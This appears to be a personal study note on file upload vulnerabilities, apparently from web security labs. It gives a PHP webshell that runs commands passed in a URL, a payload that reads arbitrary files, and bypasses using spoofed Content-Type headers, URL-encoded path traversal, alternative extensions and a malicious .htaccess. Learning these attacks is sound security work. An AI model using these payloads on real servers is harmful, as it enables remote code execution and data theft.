# File upload vulnerabilities

To read contents of an arbitrary file:
```Php
<?php echo file_get_contents('/path/to/target/file'); ?>
```

Simple webshell:
```PHP
// exploit.php content:
<?php echo system($_GET['command']); ?>

// then do the following request:
GET /example/exploit.php?command=id HTTP/1.1
```

When sending your form inputs the browser will send a post request with Content-Type: application/x-www-form-url-encoded. But this cannot be enough for sending binary data like PDF files, etc. For that, Content-Type should be multipart/form-data.

## Web shell upload via Content-Type restriction bypass
Upload a php file
Just change Content-Type header value to image/jpeg or image/png
Boom!

## Web shell upload via path traversal

We first try to upload the file and see the response:
![test](https://github.com/s4nsec/images/blob/main/Pasted%20image%2020220327214544.png)

Now we try directory traversal to see if we can save the file to another directory:
![[Pasted image 20220327214701.png]]
We see that the server prevents our path traversal attempt by removing characters. 

Now we URL encode our input and try again:
![[Pasted image 20220327214828.png]]
BOOM! With a simple URL encode, we can bypass the restriction and save the file to /files directory!

## Insufficient blacklisting of dangerous file types
Sometimes servers block uploading of files with the extension .php, etc.
But we can simply bypass this by changing the extension to .php5, .shtml, etc.

## Overriding server configs
Usually servers have config files in which extensions to be executed are declared.
For a .php file to be executed by a client's request, a developer may add the following to /etc/apache2/apache2.conf:
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so AddType application/x-httpd-php .php
```

Many servers will allow directory specific config files to override or to be added to the global ones. For example, in Apache, directory specific config files are loaded from .htaccess file.
Similarly, IIS server can be configured to do the same via web.config file:
```
<staticContent> <mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
```

Let's upload a .htaccess file with our own configuration to make a file with an extension not blocked by the server to be executed as php file.
.htaccess content:
```
AddType application/x-httpd-php .fun
```

Now, if we just change the extension of our php file to .fun, it will not be blocked, and will be uploaded. Then we can call it and have it executed by the server.
